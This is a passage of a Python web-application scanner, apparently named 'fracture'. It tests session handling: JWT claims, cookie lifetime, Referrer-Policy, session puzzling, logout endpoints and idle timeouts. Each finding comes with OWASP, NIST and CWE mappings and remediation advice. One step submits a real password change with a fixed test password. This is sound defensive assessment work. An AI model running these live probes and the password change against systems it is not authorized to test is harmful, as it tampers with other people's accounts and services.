                    output=f"Source: {_jwt_src} ({_jwt_name})\nSensitive keys: {', '.join(_found_sensitive)}",
                    sources="fracture-session", service=target["scheme"],
                    output_file=_jwt_ev,
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="SC-28",
                    cwe=["CWE-315"],
                    remediation=(
                        "Remove sensitive data from JWT payloads. Store sensitive "
                        "data server-side and reference it by ID. Use JWE (encrypted "
                        "JWT) if payload confidentiality is required."
                    ),
                )
                vc.log(f"[session] JWT sensitive data: {', '.join(_found_sensitive)}", "SUCCESS")

            # Check 5: Missing aud claim
            if "aud" not in _payload:
                out.add_finding(
                    title="JWT Missing Audience Claim",
                    url=url, port=target["port"], risk="LOW",
                    description=(
                        f"JWT in {_jwt_src} '{_jwt_name}' has no 'aud' (audience) claim. "
                        f"Without audience restriction, tokens intended for one service "
                        f"may be replayed against a different service that shares the "
                        f"same signing key."
                    ),
                    output=f"Source: {_jwt_src} ({_jwt_name})\nPayload keys: {list(_payload.keys())}",
                    sources="fracture-session", service=target["scheme"],
                    output_file=_jwt_ev,
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="IA-5",
                    cwe=["CWE-284"],
                    remediation=(
                        "Include an 'aud' claim in all JWTs identifying the intended "
                        "recipient. Validate the audience server-side and reject tokens "
                        "with unexpected audience values."
                    ),
                )
                vc.log(f"[session] JWT missing aud in {_jwt_src} '{_jwt_name}'", "SUCCESS")
        except (json.JSONDecodeError, Exception):
            pass
    if not _jwt_candidates:
        vc.log("[session] No JWT tokens found in cookies or Authorization header", "INFO")

    # ── Step 9: Session After Password Change ──────────────────────────
    vc.status(phase, "Session Analysis", "running", "Session after password change", 9, 13)
    _pw_change_url = cfg.get("auth", {}).get("password_change_url", "")
    if _pw_change_url:
        vc.log(f"[session] Testing session persistence after password change at {_pw_change_url}", "INFO")
        try:
            _pre_pw_cookies = dict(auth_sess.cookies)
            _old_sess = _make_session(cfg)
            for k, v in _pre_pw_cookies.items():
                _old_sess.cookies.set(k, v)
            # Verify old session works before password change
            _pre_check = _old_sess.get(url, timeout=timeout)
            _pre_is_authed = (
                _pre_check.status_code == 200
                and not _SESS_LOGIN_RE.search(_pre_check.url or "")
                and not _matches_error_fingerprint(_pre_check.text or "")
            )
            if _pre_is_authed:
                # Attempt password change via a disposable session
                _pw_sess = _make_session(cfg)
                for k, v in _pre_pw_cookies.items():
                    _pw_sess.cookies.set(k, v)
                _pw_r = _pw_sess.post(_pw_change_url, timeout=timeout,
                                      data={"password": "Fracture_Test_1!", "confirm": "Fracture_Test_1!"},
                                      allow_redirects=True)
                if _pw_r.status_code in (200, 302):
                    # Check if old session still works
                    _post_check = _old_sess.get(url, timeout=timeout)
                    _spa_shell = False
                    try:
                        _unauth_pw = _make_session(cfg)
                        _unauth_pw_r = _unauth_pw.get(url, timeout=timeout)
                        if (_unauth_pw_r and _unauth_pw_r.status_code == 200
                                and _post_check.status_code == 200):
                            if (_p20_body_hash((_post_check.text or "").strip())
                                    == _p20_body_hash((_unauth_pw_r.text or "").strip())):
                                _spa_shell = True
                    except Exception:
                        pass
                    if (_post_check.status_code == 200
                            and not _spa_shell
                            and not _SESS_LOGIN_RE.search(_post_check.url or "")
                            and not _matches_error_fingerprint(_post_check.text or "")):
                        _pw_ev = ""
                        try:
                            _pw_rq, _pw_rp = _save_http_evidence(
                                out, phase, f"session_after_pw_{hostname}", _post_check)
                            _pw_ev = json.dumps([{
                                "url": url, "req": str(_pw_rq), "resp": str(_pw_rp),
                            }])
                        except Exception:
                            pass
                        out.add_finding(
                            title="Session Persists After Password Change",
                            url=url, port=target["port"], risk="MEDIUM",
                            description=(
                                "Existing sessions remain valid after a password change. "
                                "If an attacker has compromised a session, changing the "
                                "password does not revoke their access. All existing "
                                "sessions should be invalidated upon password change."
                            ),
                            output=(
                                f"Password change URL: {_pw_change_url}\n"
                                f"Password change response: HTTP {_pw_r.status_code}\n"
                                f"Old session still valid: Yes (HTTP {_post_check.status_code})"
                            ),
                            sources="fracture-session", service=target["scheme"],
                            output_file=_pw_ev,
                            owasp="A07:2025 Identification and Authentication Failures",
                            nist="AC-12",
                            cwe=["CWE-613"],
                            remediation=(
                                "Invalidate all existing sessions for the user when their "
                                "password is changed. Force re-authentication on all devices."
                            ),
                        )
                        vc.log("[session] Session persists after password change", "SUCCESS")
                    else:
                        vc.log("[session] Session correctly invalidated after password change", "INFO")
        except Exception:
            vc.log("[session] Password change session test failed (request error)", "WARN")
    else:
        vc.log("[session] No password_change_url configured — skipping session-after-pw-change test", "INFO")

    # ── Step 10: Absolute Session Timeout — WSTG-SESS-07 ───────────────
    vc.status(phase, "Session Analysis", "running", "Absolute session timeout", 10, 13)
    vc.log(f"[session] Checking session timeout configuration for {hostname}", "INFO")
    try:
        _timeout_issues = []
        _no_expiry_cookies = []
        for cookie in auth_sess.cookies:
            if _INFRA_COOKIE_RE.match(cookie.name):
                continue
            if not re.search(r'sess|token|auth|sid', cookie.name, re.I):
                continue
            _max_age = None
            _expires = cookie.expires
            # Check Max-Age from the cookie jar (Python's cookiejar stores
            # the computed expires timestamp, not raw Max-Age).
            if _expires:
                import time as _timeout_time
                _remaining = _expires - _timeout_time.time()
                if _remaining > 2592000:  # >30 days
                    _timeout_issues.append((cookie.name, "MEDIUM",
                        f"Expires in {_remaining / 86400:.0f} days (>30 days)"))
                elif _remaining > 86400:  # >24 hours
                    _timeout_issues.append((cookie.name, "LOW",
                        f"Expires in {_remaining / 3600:.1f} hours (>24 hours)"))
            else:
                # Session cookie — no persistent timeout; expires on browser close.
                # This is fine for browser-close behaviour but means no absolute
                # timeout is enforced client-side.
                _no_expiry_cookies.append(cookie.name)

        for _ck_name, _ck_risk, _ck_detail in _timeout_issues:
            _to_ev = ""
            try:
                _to_ev_path = out.output_path(phase, f"timeout_{_ck_name}_{hostname}")
                _to_ev_path.write_text(
                    f"Session Timeout Analysis\nCookie: {_ck_name}\n{_ck_detail}\n",
                    encoding="utf-8")
                _to_ev = str(_to_ev_path)
            except Exception:
                pass
            out.add_finding(
                title="Excessive Session Cookie Lifetime",
                url=url, port=target["port"], risk=_ck_risk,
                description=(
                    f"Session cookie '{_ck_name}' has an excessively long lifetime: "
                    f"{_ck_detail}. Long-lived session cookies increase the window "
                    f"for session hijacking via stolen cookies."
                ),
                output=f"Cookie: {_ck_name}\n{_ck_detail}",
                sources="fracture-session", service=target["scheme"],
                output_file=_to_ev,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="AC-12",
                cwe=["CWE-613"],
                remediation=(
                    "Set session cookie Max-Age/Expires to a reasonable duration "
                    "(4-8 hours for standard apps, shorter for sensitive apps). "
                    "Implement absolute server-side session timeout independent of "
                    "cookie expiry."
                ),
            )
            vc.log(f"[session] Excessive timeout: {_ck_name} — {_ck_detail}", "SUCCESS")
        if not _timeout_issues:
            vc.log("[session] Session cookie timeouts within acceptable range", "INFO")
    except Exception:
        vc.log("[session] Absolute session timeout check failed", "WARN")

    # ── Step 11: Referer Token Leakage + Mixed Content — WSTG-SESS-09 ─
    vc.status(phase, "Session Analysis", "running", "Referer leakage / mixed content", 11, 13)
    vc.log(f"[session] Checking Referrer-Policy and mixed content for {hostname}", "INFO")
    try:
        _ref_r = auth_sess.get(url, timeout=timeout)
        _ref_policy = ""
        for _rp_hdr in ("Referrer-Policy", "referrer-policy"):
            _ref_policy = _ref_r.headers.get(_rp_hdr, "")
            if _ref_policy:
                break
        # Parse external links from body
        _ext_links = []
        _target_host = urllib.parse.urlparse(url).hostname or hostname
        for _href in re.findall(r'href=["\']([^"\']+)["\']', (_ref_r.text or "")[:100000]):
            try:
                _href_parsed = urllib.parse.urlparse(_href)
                if (_href_parsed.scheme in ("http", "https")
                        and _href_parsed.hostname
                        and _href_parsed.hostname.lower() != _target_host.lower()):
                    _ext_links.append(_href)
            except Exception:
                pass
        if _ext_links and not _ref_policy:
            _ref_ev = ""
            try:
                _ref_ev_path = out.output_path(phase, f"referer_leak_{hostname}")
                _ref_ev_path.write_text(
                    f"Referer Token Leakage Analysis\n"
                    f"Referrer-Policy header: NOT SET\n"
                    f"External links found: {len(_ext_links)}\n"
                    + "\n".join(f"  {l}" for l in _ext_links[:20]) + "\n",
                    encoding="utf-8")
                _ref_ev = str(_ref_ev_path)
            except Exception:
                pass
            out.add_finding(
                title="Missing Referrer-Policy With External Links",
                url=url, port=target["port"], risk="MEDIUM",
                description=(
                    f"The page contains {len(_ext_links)} external link(s) but no "
                    f"Referrer-Policy header is set. Browsers default to sending the "
                    f"full URL (including any session tokens in query parameters or "
                    f"URL paths) as the Referer header when users click external links."
                ),
                output=(
                    f"Referrer-Policy: NOT SET\n"
                    f"External links: {len(_ext_links)}\n"
                    f"Sample: {', '.join(_ext_links[:3])}"
                ),
                sources="fracture-session", service=target["scheme"],
                output_file=_ref_ev,
                owasp="A07:2025 Identification and Authentication Failures",
                nist="SC-23",
                cwe=["CWE-200"],
                remediation=(
                    "Set Referrer-Policy header to 'strict-origin-when-cross-origin' "
                    "or 'no-referrer' to prevent URL leakage. Apply via HTTP header "
                    "or <meta> tag."
                ),
            )
            vc.log(f"[session] Missing Referrer-Policy with {len(_ext_links)} external links", "SUCCESS")
        elif _ref_policy:
            vc.log(f"[session] Referrer-Policy set: {_ref_policy}", "INFO")
        else:
            vc.log("[session] No external links found — Referer leakage not applicable", "INFO")

        # Mixed content check (HTTP resources on HTTPS page)
        if url.startswith("https://"):
            _http_resources = re.findall(
                r'(?:src|href|action)=["\']http://[^"\']+["\']',
                (_ref_r.text or "")[:100000])
            if _http_resources:
                _mc_ev = ""
                try:
                    _mc_ev_path = out.output_path(phase, f"mixed_content_{hostname}")
                    _mc_ev_path.write_text(
                        f"Mixed Content Analysis\n"
                        f"HTTPS page: {url}\n"
                        f"HTTP resources found: {len(_http_resources)}\n"
                        + "\n".join(f"  {r}" for r in _http_resources[:20]) + "\n",
                        encoding="utf-8")
                    _mc_ev = str(_mc_ev_path)
                except Exception:
                    pass
                out.add_finding(
                    title="Mixed Content on Authenticated Page",
                    url=url, port=target["port"], risk="LOW",
                    description=(
                        f"The authenticated HTTPS page loads {len(_http_resources)} "
                        f"resource(s) over plain HTTP. Mixed content allows a network "
                        f"attacker to inject malicious resources (scripts, styles) into "
                        f"the authenticated page via MITM."
                    ),
                    output="\n".join(_http_resources[:5]),
                    sources="fracture-session", service=target["scheme"],
                    output_file=_mc_ev,
                    owasp="A07:2025 Identification and Authentication Failures",
                    nist="SC-8",
                    cwe=["CWE-319"],
                    remediation=(
                        "Load all resources over HTTPS. Use Content-Security-Policy: "
                        "upgrade-insecure-requests to automatically upgrade HTTP to HTTPS."
                    ),
                )
                vc.log(f"[session] Mixed content: {len(_http_resources)} HTTP resources", "SUCCESS")
    except Exception:
        vc.log("[session] Referer / mixed content check failed", "WARN")

    # ── Step 12: Session Puzzling — WSTG-SESS-08 ──────────────────────
    vc.status(phase, "Session Analysis", "running", "Session puzzling", 12, 13)
    vc.log(f"[session] Testing session puzzling / variable overloading for {hostname}", "INFO")
    _puzzle_paths = ["/login", "/register", "/signup", "/forgot-password",
                     "/password-reset", "/profile", "/account", "/dashboard"]
    try:
        _puzzle_results = {}
        for _pp in _puzzle_paths:
            try:
                _ps = _make_session(cfg)
                _pr = _ps.get(url + _pp, timeout=timeout, allow_redirects=True)
                if _pr.status_code in (200, 302, 301):
                    _sess_cookies = {}
                    for _pc in _ps.cookies:
                        if re.search(r'sess|token|auth|sid', _pc.name, re.I):
                            _sess_cookies[_pc.name] = _pc.value
                    if _sess_cookies:
                        _puzzle_results[_pp] = _sess_cookies
            except Exception:
                pass
        # Analyse: if 3+ different functional paths set the same session
        # cookie name, that's the same session variable being used across
        # distinct security contexts (session puzzling).
        if len(_puzzle_results) >= 3:
            _common_names = set()
            for _path_cookies in _puzzle_results.values():
                if not _common_names:
                    _common_names = set(_path_cookies.keys())
                else:
                    _common_names &= set(_path_cookies.keys())
            if _common_names:
                # Check if the values differ — same name but different context
                _context_varying = []
                for _cn in _common_names:
                    _vals = set(
                        _puzzle_results[p][_cn]
                        for p in _puzzle_results if _cn in _puzzle_results[p])
                    if len(_vals) > 1:
                        _context_varying.append(_cn)
                if _context_varying:
                    _pz_ev = ""
                    try:
                        _pz_ev_path = out.output_path(phase, f"session_puzzling_{hostname}")
                        _pz_ev_path.write_text(
                            f"Session Puzzling Analysis\n"
                            f"Target: {hostname}\n"
                            f"Paths tested: {', '.join(_puzzle_results.keys())}\n"
                            f"Shared session cookies: {', '.join(_common_names)}\n"
                            f"Context-varying cookies: {', '.join(_context_varying)}\n"
                            + "\n".join(
                                f"  {p}: {json.dumps(c)}"
                                for p, c in _puzzle_results.items()) + "\n",
                            encoding="utf-8")
                        _pz_ev = str(_pz_ev_path)
                    except Exception:
                        pass
                    out.add_finding(
                        title="Potential Session Puzzling",
                        url=url, port=target["port"], risk="LOW",
                        description=(
                            f"The same session cookie name(s) ({', '.join(_context_varying)}) "
                            f"are assigned different values across functionally distinct paths "
                            f"({', '.join(_puzzle_results.keys())}). This may indicate session "
                            f"variable overloading where authentication state from one context "
                            f"(e.g. password reset) can be leveraged in another (e.g. login)."
                        ),
                        output=(
                            f"Paths tested: {len(_puzzle_results)}\n"
                            f"Varying cookies: {', '.join(_context_varying)}\n"
                            + "\n".join(
                                f"  {p}: {', '.join(f'{n}={v[:20]}...' for n, v in c.items())}"
                                for p, c in _puzzle_results.items())
                        ),
                        sources="fracture-session", service=target["scheme"],
                        output_file=_pz_ev,
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="SC-23",
                        cwe=["CWE-384"],
                        remediation=(
                            "Use separate session variables for each functional context "
                            "(authentication, registration, password reset). Regenerate "
                            "session IDs at each privilege boundary. Do not reuse session "
                            "objects across security contexts."
                        ),
                    )
                    vc.log(f"[session] Session puzzling detected: {', '.join(_context_varying)}", "SUCCESS")
                else:
                    vc.log("[session] Session cookies consistent across paths — no puzzling detected", "INFO")
            else:
                vc.log("[session] No common session cookies across functional paths", "INFO")
        else:
            vc.log(f"[session] Only {len(_puzzle_results)} paths returned session cookies — insufficient for puzzling analysis", "INFO")
    except Exception:
        vc.log("[session] Session puzzling test failed", "WARN")

    vc.status(phase, "Session Analysis", "complete", "Done", 13, 13)
    vc.log("[session] Phase complete", "SUCCESS")


# ─────────────────────────────────────────────
# Phase 22: Logout (post-context, runs once)
# ─────────────────────────────────────────────
def _phase_logout(target: dict, cfg: dict, pm: ProgressManager,
                  out: OutputManager,
                  completed_role_sessions: dict,
                  all_crawl_links: list) -> None:
    """Post-context: missing logoff detection, session timeout probe,
    and server-side logout invalidation testing.

    Runs once, against the first completed authenticated role.  Uses only
    disposable clone sessions — the live sessions in completed_role_sessions
    are never touched so that access_matrix (which runs after) still has
    valid sessions for its probes.
    """
    phase    = "logout"
    url      = target["url"]
    hostname = target["hostname"]
    timeout  = cfg.get("timeout", 10)

    # Pick the first authenticated role's session
    _logout_role_label = None
    _logout_src_sess   = None
    for _lbl, _s in completed_role_sessions.items():
        if _lbl != "unauthenticated" and _s is not None:
            _logout_role_label = _lbl
            _logout_src_sess   = _s
            break

    if _logout_src_sess is None:
        vc.log("[logout] No authenticated sessions available — skipping phase", "INFO")
        return

    # ── Auth-gating guard ────────────────────────────────────────────────
    # If the target URL returns 200 for an unauthenticated request (catch-all
    # page, SPA shell, public page), session tests are meaningless — the page
    # is not behind authentication and any "session not invalidated" finding
    # would be a false positive.
    try:
        _unauth_guard = requests.Session()
        _unauth_guard.verify = cfg.get("verify_ssl", False)
        _ug_r = _unauth_guard.get(url, timeout=timeout, allow_redirects=True)
        if (_ug_r.status_code == 200
                and not _matches_error_fingerprint(_ug_r.text)
                and not _response_is_error_page(_ug_r.text)):
            # The page is publicly accessible. Check if the response looks
            # like the same content the authed session sees.
            try:
                _ag_r = _logout_src_sess.get(url, timeout=timeout, allow_redirects=True)
                if (_ag_r.status_code == 200
                        and (_p20_body_hash((_ag_r.text or "").strip())
                             == _p20_body_hash((_ug_r.text or "").strip()))):
                    vc.log("[logout] Target URL returns same response authed and unauthed "
                           "(normalized body hash match) "
                           "— page is not behind auth, skipping session tests", "INFO")
                    return
            except Exception:
                pass
    except Exception:
        pass

    vc.log(f"[logout] Testing session lifecycle for role: {_logout_role_label}", "INFO")
    vc.status(phase, "Logout Testing", "running", "Logoff function detection", 0, 5)

    _LOGOUT_URL_RE = re.compile(
        r'/(?:logout|signout|sign.?out|logoff|log.?off|sign_out|log_out|'
        r'session[/_]?destroy|auth[/_]?logout|account[/_]?logout|'
        r'user[/_]?logout|api[/_]?(?:logout|signout)|end.?session|bye|exit)',
        re.I
    )

    # ── 1. Missing logoff function detection ───────────────────────────────
    _logout_url = None

    # Search crawl links
    for _link in all_crawl_links:
        if _LOGOUT_URL_RE.search(_link):
            _logout_url = _link
            break

    # Search structure_map.json
    if not _logout_url:
        _sm_path = out.root / "structure_map.json"
        if _sm_path.exists():
            try:
                _sm = json.loads(_sm_path.read_text(encoding="utf-8"))
                for _pkey in _sm.keys():
                    if _LOGOUT_URL_RE.search(_pkey):
                        _logout_url = url.rstrip("/") + _pkey
                        break
            except Exception:
                pass

    # Probe common logout paths
    if not _logout_url:
        for _lpath in ("/logout", "/signout", "/logoff", "/sign-out", "/log-out",
                       "/auth/logout", "/api/logout", "/session/destroy",
                       "/account/logout", "/user/logout"):
            try:
                _clone = _make_session(cfg)
                for _cn, _cv in dict(_logout_src_sess.cookies).items():
                    _clone.cookies.set(_cn, _cv)
                _rp = _clone.get(url.rstrip("/") + _lpath, timeout=timeout,
                                 allow_redirects=False)
                if _rp.status_code in (200, 301, 302, 303):
                    _logout_url = url.rstrip("/") + _lpath
                    break
            except Exception:
                pass

    if not _logout_url:
        _no_logout_ev = ""
        try:
            _no_logout_path = out.output_path(phase, "no_logout_probes")
            _no_logout_path.write_text(
                "Logout endpoint probe results — all checked paths returned no logout function\n"
                "Checked crawl links, structure_map, and common paths:\n"
                "  /logout /signout /logoff /sign-out /log-out\n"
                "  /auth/logout /api/logout /session/destroy\n"
                "  /account/logout /user/logout\n",
                encoding="utf-8")
            _no_logout_ev = str(_no_logout_path)
        except Exception:
            pass
        out.add_finding(
            title="No Logout (Logoff) Function Detected",
            url=url, port=target["port"], risk="MEDIUM",
            description=(
                "No logout or session-termination endpoint was found in the "
                "crawl data, structure map, or at common logout paths. "
                "Users may be unable to explicitly invalidate their sessions, "
                "leaving stolen tokens usable indefinitely."
            ),
            output=(
                "Checked: crawl links, structure_map, and common paths "
                "(/logout /signout /logoff /sign-out /log-out "
                "/auth/logout /api/logout /session/destroy)"
            ),
            sources="fracture-logout", service=target["scheme"],
            output_file=_no_logout_ev,
            owasp="A07:2025 Identification and Authentication Failures",
            nist="SC-23",
            remediation=(
                "Implement an explicit logout endpoint. On logout, invalidate "
                "the session server-side and instruct the client to clear session "
                "cookies (Set-Cookie: ...; Max-Age=0)."
            ),
        )
        vc.log("[logout] No logout function detected", "SUCCESS")
    else:
        vc.log(f"[logout] Logout endpoint identified: {_logout_url}", "INFO")

    # ── 2. Session idle timeout probe (up to 600s / 10 minutes) ───────────
    vc.status(phase, "Logout Testing", "running", "Session timeout probe", 1, 5)

    # Clone source session cookies into an idle probe session that is
    # never refreshed during the wait, giving the server a truly idle token.
    _idle_probe = _make_session(cfg)
    for _cn, _cv in dict(_logout_src_sess.cookies).items():
        _idle_probe.cookies.set(_cn, _cv)

    _TIMEOUT_EXPIRED_RE = re.compile(
        r'login|sign.?in|auth(?:enticate)?|session.?expired|timed.?out|'
        r'please.{0,20}log.{0,10}in|your session|access denied', re.I
    )

    # Check session cookie Max-Age / Expires for a pre-configured long lifetime
    for _ck in _logout_src_sess.cookies:
        if re.search(r'sess|token|auth|sid', _ck.name, re.I):
            if hasattr(_ck, 'expires') and _ck.expires:
                _remaining = _ck.expires - int(time.time())
                if _remaining > 1800:   # > 30 minutes
                    _timeout_mins = _remaining // 60
                    # ── Build evidence file ────────────────────────────────
                    # The finding is metadata-only (the cookie's expiry
                    # attribute); there is no HTTP exchange to capture in
                    # the usual req/resp form. Persist the full cookie's
                    # attributes as the evidence so the operator can
                    # confirm the verdict without re-running the scan.
                    try:
                        _ck_expires_iso = (
                            datetime.fromtimestamp(_ck.expires).isoformat()
                            if _ck.expires else "(session cookie)"
                        )
                    except Exception:
                        _ck_expires_iso = str(_ck.expires)
                    _ev_lines = [
                        f"Cookie name:      {_ck.name}",
                        f"Value (first 20): {(_ck.value or '')[:20]}...",
                        f"Domain:           {getattr(_ck, 'domain', '') or '(default)'}",
                        f"Path:             {getattr(_ck, 'path', '/') or '/'}",
                        f"Secure:           {getattr(_ck, 'secure', False)}",
                        f"HttpOnly:         {bool(_ck.has_nonstandard_attr('HttpOnly')) if hasattr(_ck, 'has_nonstandard_attr') else 'unknown'}",
                        f"SameSite:         {_ck._rest.get('SameSite', 'unset') if hasattr(_ck, '_rest') else 'unknown'}",
                        f"Expires (epoch):  {_ck.expires}",
                        f"Expires (ISO):    {_ck_expires_iso}",
                        f"Remaining (sec):  {_remaining}",
                        f"Remaining (min):  {_timeout_mins}",
                        f"OWASP threshold:  30 min  (this cookie exceeds it by {_timeout_mins - 30} min)",
                        "",
                        "Full cookie jar snapshot at time of check:",
                    ]
                    for _other in _logout_src_sess.cookies:
                        _ev_lines.append(
                            f"  - {_other.name}={(_other.value or '')[:15]}... "
                            f"domain={getattr(_other, 'domain', '(default)')} "
                            f"expires={getattr(_other, 'expires', 'session')}"
                        )
                    _ev_body = "\n".join(_ev_lines)
                    # Build the JSON-array output_file with an inline synthetic
                    # req/resp entry so Crucible can render Evidence even when
                    # the disk write fails. Prior versions wrote a single .txt
                    # file and put its absolute path in output_file — when the
                    # write failed silently (caught by `except Exception`) the
                    # operator was left with no Evidence whatsoever. Now the
                    # inline entry is unconditional; the file-based entry is
                    # appended only when the write actually succeeds.
                    _ev_entries: list = [{
                        "url":  f"COOKIE ANALYSIS  {_ck.name}  (metadata-only finding)",
                        "req":  _ev_body,
                        "resp": (
                            "This finding is derived from a cookie's expiry attribute, "
                            "not from a server response. The full cookie attributes "
                            "and a snapshot of the cookie jar at probe time are in the "
                            "Request pane on the left."
                        ),
                    }]
                    try:
                        _ev_path = out.output_path(
                            phase,
                            f"excessive_timeout_{_ck.name}_{hostname}",
                        )
                        _ev_path.parent.mkdir(parents=True, exist_ok=True)
                        _ev_path.write_text(_ev_body, encoding="utf-8")
                        _ev_entries.append({
                            "url":  f"COOKIE ANALYSIS  {_ck.name}  (saved file)",
                            "file": str(_ev_path),
                        })
                    except Exception as _ev_exc:
                        vc.log(
                            f"[logout] Failed to persist cookie-timeout evidence file "
                            f"for {_ck.name}: {_ev_exc!r} — inline evidence still available",
                            "WARNING",
                        )

                    out.add_finding(
                        title="Excessive Session Timeout Configured",
                        url=url, port=target["port"], risk="MEDIUM",
                        description=(
                            f"The session cookie '{_ck.name}' has a configured "
                            f"absolute expiry of approximately {_timeout_mins} minutes. "
                            f"OWASP recommends 15–30 minutes of idle timeout for "
                            f"sensitive applications. The cookie's full attributes "
                            f"(Max-Age / Expires / Secure / HttpOnly / SameSite / "
                            f"Domain / Path) are captured in the Evidence panel."
                        ),
                        output=_ev_body,
                        output_file=json.dumps(_ev_entries),
                        sources="fracture-logout", service=target["scheme"],
                        owasp="A07:2025 Identification and Authentication Failures",
                        nist="AC-11",
                        remediation=(
                            "Reduce session lifetime to 15–30 minutes for sensitive "
                            "applications. Complement absolute expiry with server-side "
                            "idle timeout independent of the cookie's Max-Age."
                        ),
                    )
                    vc.log(
                        f"[logout] Cookie '{_ck.name}' expires in ~{_timeout_mins} min "
                        f"(MEDIUM — excessive)", "SUCCESS"
                    )
            break

    _timeout_interval = 60    # seconds between idle probes
    _timeout_max      = 600   # 10-minute ceiling
    _timeout_elapsed  = 0
    _timeout_detected = False
    _timeout_at       = None
    _first_probe_resp = None     # captured for evidence
    _last_probe_resp  = None     # captured for evidence
    _probe_status_log: list = []  # [(elapsed_seconds, status_code, body_len)]

    # Guard: if the authenticated landing page is a custom error page, the
    # idle timeout probe is meaningless — the page always returns 200
    # regardless of session state.
    try:
        _to_guard = _idle_probe.get(url, timeout=timeout, allow_redirects=True)
        if _to_guard and (_matches_error_fingerprint(_to_guard.text)
                          or _response_is_error_page(_to_guard.text)):
            vc.log(
                "[logout] Target URL returns a custom error page — "
                "skipping idle timeout probe (not a protected resource)",
                "INFO",
            )
            _timeout_detected = True   # suppress the finding
    except Exception:
        pass

    vc.log(
        f"[logout] Starting idle timeout probe — checking every {_timeout_interval}s "
        f"for up to {_timeout_max // 60} minutes ...", "INFO"
    )

    while _timeout_elapsed < _timeout_max:
        time.sleep(_timeout_interval)
        _timeout_elapsed += _timeout_interval
        try:
            _r_idle = _idle_probe.get(url, timeout=timeout, allow_redirects=True)
            if _first_probe_resp is None:
                _first_probe_resp = _r_idle
            _last_probe_resp = _r_idle
            _probe_status_log.append(
                (_timeout_elapsed, _r_idle.status_code, len(_r_idle.text or ""))
            )
            _expired = (
                _r_idle.status_code in (401, 403)
                or _TIMEOUT_EXPIRED_RE.search(_r_idle.url or "")
                or _TIMEOUT_EXPIRED_RE.search(_r_idle.text[:2000])
            )
            if _expired:
                _timeout_detected = True
                _timeout_at       = _timeout_elapsed
                _tm = _timeout_at // 60
                _ts = _timeout_at % 60
                vc.log(
                    f"[logout] Session expired after {_tm}m {_ts}s of idle — "
                    f"timeout active", "INFO"
                )
                break
            vc.log(f"[logout] Idle probe: session still valid at {_timeout_elapsed}s", "INFO")
        except Exception:
            pass

    if not _timeout_detected:
        # Build a probe-log body that can be embedded inline AND, when the
        # disk write succeeds, persisted as a file. The inline entry is
        # always added so that Evidence is present even when output_path /
        # write_text fails (as has been observed when the per-target dir
        # tree is missing or the role-less branch hits a permission edge).
        _to_log_body = (
            f"Session idle-timeout probe log\n"
            f"==============================\n"
            f"Target URL:     {url}\n"
            f"Probe interval: {_timeout_interval} seconds\n"
            f"Probe ceiling:  {_timeout_max} seconds ({_timeout_max // 60} min)\n"
            f"\nPer-probe results (elapsed_s, status, body_bytes):\n"
            + "\n".join(
                f"  t=+{_e:>4}s  HTTP {_s}  {_b} bytes"
                for _e, _s, _b in _probe_status_log
            )
            + "\n"
        )
        _to_evidence: list = [{
            "url":  f"PROBE LOG  {url}  (inline summary)",
            "req":  _to_log_body,
            "resp": (
                "This finding is derived from the absence of a server-side timeout. "
                "The per-probe results are in the Request pane on the left; full "
                "first/last HTTP exchanges are in the additional Evidence entries "
                "below when the disk-write succeeded."
            ),
        }]
        if _first_probe_resp is not None:
            try:
                _fp_rq, _fp_rp = _save_http_evidence(
                    out, phase, f"timeout_first_probe_{hostname}", _first_probe_resp)
                _to_evidence.append({
                    "url":  f"FIRST PROBE  GET {url} (t=+60s)",
                    "req":  str(_fp_rq), "resp": str(_fp_rp),
                })
            except Exception as _fp_exc:
                vc.log(
                    f"[logout] First-probe evidence write failed: {_fp_exc!r}",
                    "WARNING",
                )
        if _last_probe_resp is not None and _last_probe_resp is not _first_probe_resp:
            try:
                _lp_rq, _lp_rp = _save_http_evidence(
                    out, phase, f"timeout_last_probe_{hostname}", _last_probe_resp)
                _to_evidence.append({
                    "url":  f"LAST PROBE  GET {url} (t=+{_timeout_max}s)",
                    "req":  str(_lp_rq), "resp": str(_lp_rp),
                })
            except Exception as _lp_exc:
                vc.log(
                    f"[logout] Last-probe evidence write failed: {_lp_exc!r}",
                    "WARNING",
                )
        try:
            _to_log_path = out.output_path(
                phase, f"timeout_probe_log_{hostname}")
            _to_log_path.write_text(_to_log_body, encoding="utf-8")
            _to_evidence.append({
                "url":  f"PROBE LOG  {_to_log_path.name}  (saved file)",
                "file": str(_to_log_path),
            })
        except Exception as _pl_exc:
            vc.log(
                f"[logout] Probe-log file write failed: {_pl_exc!r}",
                "WARNING",
            )

        out.add_finding(
            title="Session Timeout Absent or Excessive",
            url=url, port=target["port"], risk="HIGH",
            description=(
                f"The authenticated session remained valid after {_timeout_max} seconds "
                f"({_timeout_max // 60} minutes) of inactivity. No server-side idle "
                f"timeout was detected. An attacker who obtains a valid session token "
                f"can exploit it indefinitely without time pressure. "
                f"Evidence contains the probe log and (when disk-writes succeed) the "
                f"first probe, last probe, and saved probe log."
            ),
            output=(
                f"Probe interval:  {_timeout_interval}s\n"
                f"Probe ceiling:   {_timeout_max}s ({_timeout_max // 60} min)\n"
                f"Probes sent:     {len(_probe_status_log)}\n"
                f"Final status:    "
                + (f"HTTP {_last_probe_resp.status_code} (cookies still accepted)"
                   if _last_probe_resp is not None else "(no probe response)")
                + "\nVerdict:         session NEVER expired during the 10-minute idle test"
            ),
            output_file=json.dumps(_to_evidence),
            sources="fracture-logout", service=target["scheme"],
            owasp="A07:2025 Identification and Authentication Failures",
            nist="AC-11",
            remediation=(
                "Implement an idle session timeout of 15–30 minutes for sensitive "
                "applications. Expire the server-side session record on inactivity — "
                "do not rely solely on cookie Max-Age. Display a warning to the user "
                "before automatic expiry."
            ),
        )
        vc.log("[logout] No session timeout detected after 600s idle", "SUCCESS")

    # ── 3. Server-side logout invalidation ────────────────────────────────
    _REDIR_LOGIN_RE = re.compile(
        r'login|sign.?in|auth(?:enticate)?|session.?expired', re.I
    )

    if _logout_url:
        vc.status(phase, "Logout Testing", "running", "Server-side invalidation check", 2, 5)

        _pre_logout_cookies = dict(_logout_src_sess.cookies)

        # Identify an authenticated endpoint for post-logout probing
        _auth_probe_url = url
        _sm_path = out.root / "structure_map.json"
        if _sm_path.exists():
            try:
                _sm2 = json.loads(_sm_path.read_text(encoding="utf-8"))
                for _p2, _inf2 in _sm2.items():
                    if (isinstance(_inf2, dict)
                            and _inf2.get("status") == 200
